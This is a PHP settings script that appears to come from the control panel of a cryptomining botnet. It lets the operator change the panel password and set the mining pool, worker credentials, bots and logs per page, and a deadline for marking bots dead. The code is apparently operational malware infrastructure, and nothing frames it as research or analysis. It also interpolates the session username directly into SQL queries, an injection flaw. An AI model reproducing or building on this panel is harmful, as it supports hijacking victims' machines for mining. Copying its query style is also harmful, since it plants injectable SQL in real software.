<?php
include '../inc/config.php';
include '../inc/functions.php';
AuthenticatedCheck('LoggedOut');

$pass = $con->query("SELECT password FROM users WHERE username='$_SESSION[username]'")->fetchColumn(0);

if(isset($_POST['worker-name'])) {

    if (!empty($_POST['newpassword']))
    {
        if(getPass($_SESSION['username'],$_POST['oldpassword']) != $pass) die('<font color="red">Wrong password!</font>');
        if($_POST['newpassword'] != $_POST['repassword']) die('<font color="red">Passwords must match</font>');
        $con->prepare("UPDATE users SET password=? WHERE username='$_SESSION[username]'")->execute(array(getPass($_SESSION['username'], $_POST['newpassword'])));
    }

    $botpp = (int)$_POST['botsperpage'];
    $logpp = (int)$_POST['logsperpage'];
    $con->prepare("UPDATE settings SET pool=:pool, worker=:worker, wpassword=:wpassword, botspg=:botspg, logspg=:logspg, deadline=:deadline")->execute(array(
        ':pool' => $_POST['miner-parameter'],
        ':worker' => $_POST['worker-name'],
        ':wpassword' => $_POST['work-password'],
        ':botspg' => in_array($botpp,range(5,20))?$botpp:($botpp > 20?20:'').($botpp < 5?5:''),
        ':logspg' => in_array($logpp,range(5,20))?$logpp:($logpp > 20?20:'').($logpp < 5?5:''),
        ':deadline' => (int)$_POST['markdead']
    ));

    echo '<font color="limegreen">Settings updated!</font>';
}else
    echo '<font color="red">Invalid request</font>';